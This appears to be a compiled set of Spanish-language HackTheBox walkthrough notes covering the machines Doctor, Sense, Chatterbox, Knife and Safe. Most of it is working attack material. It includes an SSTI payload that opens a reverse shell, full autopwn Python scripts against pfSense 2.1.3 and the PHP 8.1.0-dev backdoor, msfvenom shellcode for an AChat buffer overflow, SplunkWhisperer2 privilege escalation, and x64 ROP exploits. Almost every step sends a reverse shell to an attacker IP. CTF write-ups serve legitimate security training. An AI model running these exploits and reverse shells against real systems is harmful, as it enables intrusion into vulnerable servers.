    Title: {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
    Content: TEST
    ```

1. Recargamos la url `http://doctors.htb/archive`

Boom... estamos en la maquina victima.

```bash
whoami
#Output
web

hostname -I
```

Somos web y estamos en la maquina victima. Hacemos el tratamiento de la TTY.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Userpivoting {-}

```bash
cd /home
grep "$sh" /etc/passwd
cd /root
id
```

Aqui podemos ver que hay usuarios splunk y shaun y que estamos en el grupo `adm`. Podriamos visualisar los logs

```bash
cd /var/log
grep -r -i "pass"
grep -r -i "pass" 2>/dev/null
```

Vemos en el **apache2/backup** que hay una peticion POST para resetear una contraseña `Guitar123`

```bash
su shaun
Password: Guitar123

cat /home/shaun/user.txt
```

<!--chapter:end:37-Doctor/37-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
cd /
ls -l
cd /opt
```

Aqui vemos un directory splunkforward. Nos hace pensar que teniamos un puerto 8089 abierto con un splunkd.
Si vamos a esta url `https://10.10.10.209:8089` vemos un servicio splunkd.

Aqui podemos tirar de un exploit en el github de [cnotin](https://github.com/cnotin/SplunkWhisperer2) que permite hacer un
Local o un Remote privilege escalation. En este caso utilizaremos el Remoto.

```bash
git clone https://github.com/cnotin/SplunkWhisperer2
cd SplunkWhisperer2
ls
python3 PySplunkWhisperer2_remote.py
```

aqui vemos como se utiliza. Intentamos primeramente enviar una traza ICMP a nuestra maquina para ver si funcciona.

1. Nos ponemos en escucha por traza ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. lanzamos el exploit para enviar una traza ICMP

    ```bash
    python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.7 --username shaun --password Guitar123 --payload "ping -c 1 10.10.14.7"
    ```

Vemos que recibimos la traza. Ahora nos mandamos una reverse shell

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. lanzamos el exploit para entablar una reverse shell

    ```bash
    python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.7 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/bash 10.10.14.7 443"
    ```

La conneccion esta entablada.

```bash
whoami
#Output
root
```

<!--chapter:end:37-Doctor/37-04-PrivilegeEscalation.Rmd-->

# Sense {-}

## Introduccion {-}

La maquina del dia se llama Sense.

El replay del live se puede ver aqui

[![S4vitaar Doctor maquina](https://img.youtube.com/vi/WeaLhmbatT0/0.jpg)](https://www.youtube.com/watch?v=WeaLhmbatT0)

Esta maquina hace parte de una sesion intensa y se puede ver a partir de 3:39:30.

No olvideis dejar un like al video y un commentario...

<!--chapter:end:38-Sense/38-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.60
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.60
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.60 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443 10.10.10.60 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 80     | http          | Web, Fuzzing       |                      |
| 443    | https         | Web, Fuzzing       |                      |



### Analyzando la web {-}


#### Checkear la web {-}

Si entramos en la url `https://10.10.10.60`, vemos un panel de authentificacion de pfsense.
Teniendo esto en cuenta, miramos por internet si existen credenciales por defecto para este servicio.

Encontramos admin:pfsense pero no funcciona. Vamos a fuzzear la web

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-php-html http://10.10.10.60/FUZZ.FUZ2Z
```

Aqui vemos routas como:

- stats.php
- help.php
- edit.php
- system.php
- exec.php
- system-users.txt

Los recursos php nos hace un redirect a la pagina de login y la routa system-users.txt hay un mensaje para crear el usuario rohit con el 
password por defecto de la compania. probamos

```bash
rohit:pfsense
```

Hemos podido entrar. Vemos la version del servicio pfsense que es la 2.1.3.

<!--chapter:end:38-Sense/38-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### pfSense {-}


```bash
searchsploit pfsense 2.1.3
```

Vemos un exploit de typo Command Injection.

```bash
searchsploit -m 43560
mv 43560.py pfsense_exploit_rce.py
python3 pfsense_exploit_rce.py -h
```






<!--chapter:end:38-Sense/38-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con SSTI {-}

En el panel de ayuda vemos que nos pide nuestra ip y un puerto.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script

    ```bash
    python pfsense_exploit_rce.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 443 --username rohit --password pfsense
    ```

```bash
whoami
#Output
root
```

Oh my gaaaaadddddddd!!!!!!!!!

La idea aqui es crearnos nuestro proprio script en python

### Nuestro exploit {-}

```python
#!/usr/bin/python3

from pwn import *

import pdb
import urllib3
import html

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://10.10.10.60/index.php"
rce_url = "https://10.10.10.60/status_rrd_graph_img.php?database=queues;"
burpsuite = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():

    s = requests.session()
    urllib3.disable_warnings()
    s.verify = False
    r = s.get(main_url)

    csrfMagic = re.findall(r'__csrf_magic\' value="(.*?)"', r.text)[0]

    data_post = {
        '__csrf_magic': csrfMagic,
        'usernamefld': 'rohit',
        'passwordfld': 'pfsense',
        'login': 'Login'
    }

    r = s.post(main_url, data=data_post)

    p1.success("Authenticacion realizada exitosamente como el usuario rohit")

    p2 = log.progress("RCE")
    p2.status("Ejecutando comando a nivel de sistema")

    r = s.get(rce_url + '''ampersand=$(printf+\"\\46\");guion=$(printf+\"\\55\");rm+${HOME}tmp${HOME}f;mkfifo+${HOME}tmp${HOME}f;
    cat+${HOME}tmp${HOME}f|${HOME}bin${HOME}sh+${guion}i+2>${ampersand}1|nc+10.10.14.7+443+>${HOME}tmp${HOME}f''')
    
if __name__ == '__main__':

    p1 = log.progress("Authenticacion")
    p2 = log.progress("RCE")
    p1.status("Iniciando proceso de autenticacion")
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p2.failure("No se ha obtenido ninguna conexion")
    else:
        p2.success("Se ha obtenido una conexion")
        shell.interactive()
```

<!--chapter:end:38-Sense/38-03-GainingAccess.Rmd-->

# Chatterbox {-}

## Introduccion {-}

La maquina del dia se llama Chatterbox.

El replay del live se puede ver aqui

[![S4vitaar Chatterbox maquina](https://img.youtube.com/vi/WeaLhmbatT0/0.jpg)](https://www.youtube.com/watch?v=WeaLhmbatT0)

Esta maquina hace parte de una sesion intensa y se puede ver a partir de 4:50:15.

No olvideis dejar un like al video y un commentario...

<!--chapter:end:39-Chatterbox/39-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.74
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.74
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.74 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p9255,9256 10.10.10.74 -oN targeted
```


| Puerto | Servicio          | Que se nos occure? | Que falta? |
| ------ | ----------------- | ------------------ | ---------- |
| 9255   | http AChat        | Web, Fuzzing       |            |
| 9256   | achat chat system |                    |            |



<!--chapter:end:39-Chatterbox/39-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### Achat Chat system {-}

```bash
searchsploit achat
```

Todavia no savemos lo que es achat pero vemos exploit de typo Remote Buffer Overflow

```bash
searchsploit -m 36025
mv 36025.py achat_exploit.py
cat achat_exploit.py
```

Mirando el codigo, vemos que es un bufferflow normal que lanza una calculadora. Lo modificamos para
lanzar una reverse shell.

<!--chapter:end:39-Chatterbox/39-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Remote BOF {-}


1. Nos creamos un nuevo shellcode basada a la informacion del exploit

    ```bash
    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\
    x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\
    xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\
    xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\
    xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
    ```

1. Copiamos el shell code generado y lo ponemos al sitio del buff shellcode del exploit
1. Cambiamos la ip de la maquina victima
1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el exploit modificado con python 2

    ```bash
    python achat_exploit.py
    ```

```bash
whoami
#Output
chatterbox\alfred
```

Podemos leer la flag

<!--chapter:end:39-Chatterbox/39-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
cd Desktop
type root.txt
```

No podemos leer la flag de root pero es curioso que nos podamos meter en su directorio user.

```bash
icacls root.txt
cd ..
icacls Desktop
```

Vemos que el usuario alfred tiene privilegios Full sobre el directorio Desktop del usuario root.

```bash
cd Desktop
icacls root.txt /grant alfred:F
type root.txt
```

Podemos leer la flag, lol :)

<!--chapter:end:39-Chatterbox/39-04-PrivilegeEscalation.Rmd-->

# Knife {-}

## Introduccion {-}

La maquina del dia se llama Knife.

El replay del live se puede ver aqui

[![S4vitaar Knife maquina](https://img.youtube.com/vi/Um6-iIYzUWk/0.jpg)](https://www.youtube.com/watch?v=Um6-iIYzUWk)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:40-Knife/40-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.242
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.242
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.242 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | tcp      | Web, Fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.242
```

Es un Apache 2.4.41 en un Ubuntu Con una version 8.1.0-dev de PHP. 


#### Checkear la web {-}

Si entramos en la url `http://10.10.10.242`, No vemos gran cosas tenemos que aplicar Fuzzing.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-php http://10.10.10.242/FUZZ.FUZ2Z
```

Tampoco encontramos gran cosa por aqui.

#### Analyzamos las cabezeras de la respuesta al lado del servidor {-}

```bash
curl -s -X GET http://10.10.10.242 -I
```

No vemos nada. Miramos por la version de php que parece un poco rara.



<!--chapter:end:40-Knife/40-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### php 4.1.0-dev {-}

Si buscamos en google pro `PHP 8.1.0 exploit` vemos una pagina que habla de User-Agent Remote Code Execution.

La vulnerabilidad aqui reside en poner un User-Agentt con 2 T con un zerodiumsystem command.

```bash
"User-Agent": "Mozilla/5...."
"User-Agentt": "zerodiumsystem('" + COMMANDO + "');"
```

Lo intentamos

```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('whoami');"
#Output 
james
...

curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" head -n 1
```

<!--chapter:end:40-Knife/40-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con un Autopwn en Pyton {-}

```python
#!/usr/bin/python3

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.242/"
lport = 443

def makeRequest():

    headers = {
        'User-Agentt': 'zerodiumsystem("bash -c \'bash -i >& /dev/tcp/10.10.14.15/443 0>&1\'");'
    }

    r = requests.get(main_url, headers=headers)

if __name__ == '__main__':

    p1 = log.progress("Pwn Web")
    p1.status("Explotando vulnerabilidad PHP 8.1.0-dev - User Agentt Remote Code Execution")

    time.sleep(2)

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible comprometer el sistema")
        sys.exit(1)
    else:
        p1.success("Comando inyectado exitosamente")
        shell.sendline("sudo knife exec -E 'exec \"/bin/sh\"'")
        shell.interactive()
```

Lo lanzamos con el commando `python3 autopwn.py`

```bash
whoami
#Output
james

hostname -I
#Output
10.10.10.242
```


<!--chapter:end:40-Knife/40-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Podemos ejecutar el commando `/usr/bin/knife` como el usuario root sin proporcionar contraseña.

buscando por [gtfobins](https://gtfobins.github.io/gtfobins/knife/#sudo), vemos que podemos usar este
commando para ejecutar una shell.

```bash
sudo knife exec -E 'exec "/bin/bash"'
whoami
#Output 
root
```

Ya podemos leer la flag root.txt

<!--chapter:end:40-Knife/40-04-PrivilegeEscalation.Rmd-->

# Safe {-}

## Introduccion {-}

La maquina del dia se llama Safe.

El replay del live se puede ver aqui

[![S4vitaar Safe maquina](https://img.youtube.com/vi/8P_xeVB9Lhk/0.jpg)](https://www.youtube.com/watch?v=8P_xeVB9Lhk)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:41-Safe/41-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.147
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.147
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.147 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,1377 10.10.10.147 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | ssh      | Conneccion directa | creds      |
| 80     | http     | Web, Fuzzing       |            |
| 1337   | http     | Web, Fuzzing       |            |

El resultado de Nmap nos muestra algo raro con el puerto **1337**. Lo miramos con **ncat**

```bash
nc 10.10.10.247 1337

What do you want me to echo back?
AA

Ncat: Broken pipe
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.147
```

Es un Apache 2.4.25 en un Debian y parece que sea la default page de apache2. 


#### Checkear la web {-}

Si entramos en la url `http://10.10.10.147`, Vemos la pagina por por defecto de apache2.
Miramos el codigo fuente y vemos un commentario que dice `'myapp' can be dowloaded to analyse from here its running on port 1337`.

Si ponemos la url `http://10.10.10.147/myapp` podemos descargar la app y analyzarla.

<!--chapter:end:41-Safe/41-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### Analysis de myapp {-}

Si lanzamos la app descargada con el commando `./myapp` vemos la misma cosa que lo que hemos encontrado en el puerto 1337.
Vamos a ver si esta app esta vulnerable a un Buffer Overflow

```bash
python -c 'print "A"*500'
./myapp

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

#Output
zsh: segmentation fault ./myapp
```

### Buffer Overflow x64 usando Gadgets {-}

Primeramente vamos a analyzar el `myapp` con **Ghidra**.Lanzamos Ghidra, creamos un nuevo proyecto y importamos el binario `myapp`.
Una vez importado, cojemos el binario y lo Drag & Dropeamos en el Dragon. Una vez cargado, nos pide si lo queremos analysar, le decimos que si.

En la parte derecha de Ghidra, hay un panel Symbol Tree que nos permite ver las funcciones del programa, pinchamos a la function **main** y vemos 
el codigo de esta funccion. Vemos que hay una variable `local_78` creada con un tamaño de 112 bits y que recupera la entrada de usuario con la 
funccion `gets(local_78)` que es vulnerable a un BufferOverflow.

Aqui vamos a analysar mas en profundidad el binario con **gdb** con **gef**.

```bash
gdb ./myapp
info functions
r

What do you want me to echo back? Hola probando
#Output
[Inferior 1 exited normally]

r
What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui gdb nos saca un error y vemos que el `$rsp` esta sobre escito con lettras **A**

<div class="figure">
<img src="images/Safe-rsp-A.png" alt="rsp overwritted" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-77)rsp overwritted</p>
</div>

Aqui seguimos la Guia normal de un BOF.

1. Buscamos cuantos A son necessarios antes de sobre escribir el **rsp**

    - creamos un pattern de 150 caracteres
    
        ```bash
        gef➤ pattern create 150
        [+] Generating a pattern of 150 bytes (n=4)
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        [+] Saved as '$_gef0'
        ```

    - lanzamos el script otra vez y pegamos los caracteres

        ```bash
        gef➤ r
        What do you want me to echo back? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
        aauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        ```

    - el programa peta una vez mas pero el valor del `$rsp` a cambiado. Miramos el offset con el commando

        ```bash
        gef➤  pattern offset $rsp
        [+] Searching for '$rsp'
        [+] Found at offset 120 (little-endian search) likely
        ``` 

        Aqui vemos que tenemos que entrar 120 caracteres antes de sobre escribir el **rsp**.

    - Probamos con 120 A y 8 B. /!\ cuidado que como es una maquina x64 tenemos que poner 8 B y no 4.

        ```bash
        python -c '120*"A"+8*"B"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAABBBBBBBB

        gef➤ r
        What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
        #Output
        $rsp   : 0x00007fffffffde98  →  "BBBBBBBB"
        $rbp   : 0x4141414141414141 ("AAAAAAAA"?)
        $rsi   : 0x00000000004052a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
        ```

    - añadimos 8 C para saber donde caen la cosas despues del **rsp**

        ```bash
        python -c '120*"A"+8*"B"+8*"C"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AABBBBBBBBCCCCCCCC

        gef➤ r
        What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
        #Output
        ```

1. Miramos las seguridades existentes del programa

    ```bash
    gef➤  checksec
    [+] checksec for '/home/s4vitar/Desktop/HTB/Safe/content/myapp'
    Canary                        : ✘ 
    NX                            : ✓ 
    PIE                           : ✘ 
    Fortify                       : ✘ 
    RelRO                         : Partial
    ```

Vemos aqui que el NX (DEP: Data Execution Prevention) esta enabled, lo que quiere decir que deshabilita la ejecucion de codigo en la pila.
Tenemos que encontrar una via alternativa.

Si recordamos, el analysis de la funccion main con **Ghidra** era la siguiente

```c
undefined8 main (void)
{
    char myVariable [112];

    system("/usr/bin/uptime");
    printf("\nWhat do you want me to echo back? ");
    gets(myVariable);
    puts(myVariable);
    return 0;
}
```

La idea aqui seria de burlar la llamada a la funccion system("/usr/bin/uptime") para que en vez de llamar a uptime, ejecute otra cosa. Esto se hace
cambiando la cadena de texto "/usr/bin/uptime" con "/bin/sh" por ejemplo.

Hay cosas que tenemos que tener en cuenta para hacer este processo. En 64bits, hay uno orden que tenemos que tener en cuenta durante la llamada a una funccion
`rdi rci rdx rcx r8 r9`. Este order se llama **convencion de llamada**. Esto significa que los argumentos pasados por las funcciones estan almazenadas en uno
de estos registros y que siguen este orden.

Lo comprobamos de la siguiente manera.

1. Creamos un pequeño script en python para lanzar el pdb en modo debug con un breakpoint al inicio de la funccion main

    ```python
    #!/usr/bin/python3

    from pwn import *

    context(terminal=['tmux', 'new-window'])
    context(os='linux', arch='amd64)

    p = gdb.debug('.\myapp', 'b *main')

    p.recvuntil('What do you want me to echo back?')
    ```

1. Lanzamos el script con el comando `python3 exploit.py`
1. En este punto estamos parados en el principio de la funccion main, y añadimos un breakpoint al call de la funccion system

    - lo buscamos en el listing de ghidra

        <div class="figure">
        <img src="images/Safe-system-breakpoint.png" alt="system function listing breakpoint" width="90%" />
        <p class="caption">(\#fig:unnamed-chunk-78)system function listing breakpoint</p>
        </div>

    - añadimos esta direccion como breakpoint

        ```bash
        gef➤  b * 0x40116e
        gef➤  c
        gef➤  si
        gef➤  si
        gef➤  si
        gef➤  si
        ```

        el comando `b` significa Breakpoint, el comando `c` es para Continue y el `si` se puede traducir como siguiente instruccion.
        En este punto hemos llegado a la funccion system.

    - miramos lo que hay en el **rdi**

        ```bash
        gef➤  x/s $rdi
        #Output
        0x402008:   "/usr/bin/update"
        ```

        Aqui vemos que en el **rdi** esta la string correspondiendo al `/usr/bin/uptime` que es el comando que seria ejecutado por **system()**

Ahora que sabemos que el argumento pasado en la funccion **system()** tiene que ser previamente definida en el registro `rdi`, miramos de que manera
podemos tomar el control de este registro para poner el comando que queremos.

Para hacer este truco, el Tito nos recomiendo en primer lugar inspeccionar el resto de funcciones existentes. Si lo miramos con **Ghidra** en el Symbol Tree,
vemos que hay una funccion que se llama test y que contiene las ejecuciones siguientes:

<div class="figure">
<img src="images/Safe-test-fct-inspection.png" alt="test function inspection" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-79)test function inspection</p>
</div>

Aqui podemos ver que en esta funccion copia el contenido del **RSP** en el **RDI**. Esto nos cae de lujo porque con las 120 A, hemos ganado el control del **RSP**.
Esto quiere decir que si logramos desde el `rsp` lanzar la funccion *test()*, cuando termine esta funccion, nos copiara lo que hay en el `rsp` en le `rdi`. Si conseguimos
hacerlo, y que llamamos a la funccion system, nos lanzara el comando `system()` con el valor del `rdi` La difficultad de esta tecnica reside en manejar el flujo del
programa como nosotros queremos.
Si miramos la funccion test, vemos que justo despues de la copia del `rsp` al `rdi`, hay un comando **JMP** que significa Jump al registro **R13** donde a dentro, existe
una direccion (por el momento desconocida).
Aqui la idea seria cambiar lo que hay en el registro `R13` para injectarle la direccion de la function `system()`.

Para hacer este truco, tenemos que pasar por Gadgets que seria un ropper en este caso. Podemos usar **gef** para buscar si existe un Gadget en este registro.

```bash
gef➤  ropper --search "pop r13"
```

<div class="figure">
<img src="images/Safe-gadget-r13.png" alt="gef search for gadgets" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-80)gef search for gadgets</p>
</div>

Aqui vemos que tenemos un Gadget `pop r13; pop r14; pop r15;` y tenemos la direccion **401206**. Esto quiere decir que podemos meter la direction de **system()** en
`r13` y por lo de `r14` y `r15`, pondremos un byte nullo.

Para esto uzaremos el exploit.

```python
#!/usr/bin/python3

from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

p = remote("10.10.10.147", 1337)
# p = gdb.debug('./myapp', 'b *main')

p.recvuntil("What do you want me to echo back?")

# gef➤  ropper --search "pop r13"
# 0x0000000000401206: pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x401206)
junk = ("A"*112).encode()
bin_sh = "/bin/sh\x00".encode()
# JMP => r13 [system()]
# 0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          callq  401040 <system@plt>
system_plt = p64(0x40116e)
null = p64(0x0)
# â¯ objdump -D ./myapp | grep "test"
#   40100b:       48 85 c0                test   %rax,%rax
#   4010c2:       48 85 c0                test   %rax,%rax
#   401104:       48 85 c0                test   %rax,%rax
# 0000000000401152 <test>:
test = p64(0x401152)
#                             **************************************************************
#                             *                          FUNCTION                          *
#                             **************************************************************
#                             undefined test()
#             undefined         AL:1           <RETURN>
#                             test                                            XREF[3]:     Entry Point(*), 00402060, 
#                                                                                          00402108(*)  
#        00401152 55              PUSH       RBP
#        00401153 48 89 e5        MOV        RBP,RSP
#        00401156 48 89 e7        MOV        RDI,RSP # RDI => "/bin/sh\x00"
#        00401159 41 ff e5        JMP        R13 # => system($rdi)
p.sendline(junk + bin_sh + pop_r13 + system_plt + null + null + test)
p.interactive()
```

Todas las direcciones de memoria se han buscado con el comando `objdump -D ./myapp | grep "system"` o para la direccion de test con el
comando `objdump -D ./myapp | grep "test"`. Estos comandos se puenden usar porque le PIE esta desabilitado.

En este caso, que hace el script. El script nos permite finalmente ejecutar el applicativo con un flujo distincto para
ganar accesso al systema. El flujo es el siguiente.

1. Lanzamos el binario
1. Introducimos 112 A (120 del offset menos los 8 bytes del comando "/bin/sh\x00") => 7 caracteres + 1 nullByte.
1. Introducimos el commando `/bin/sh\x00`
1. Apuntamos a la direccion del gadget
1. Sobre escribimos el
    - r13 con la direccion de system
    - r14 como nullo
    - r15 como nullo
1. Introducimos la direccion de la funccion test


### Buffer Overflow x64 usando Memory leak {-}

```python
#!/usr/bin/python3

# Libc leaked

from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

p = remote("10.10.10.147", 1337)
# p = gdb.debug('./myapp', 'b *main')

junk = ("A"*120).encode()

# gef➤  ropper --search "pop rdi"
# 0x000000000040120b: pop rdi; ret; 

pop_rdi = p64(0x40120b)

# objdump -D ./myapp | grep "system"
# 0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          callq  401040 <system@plt>

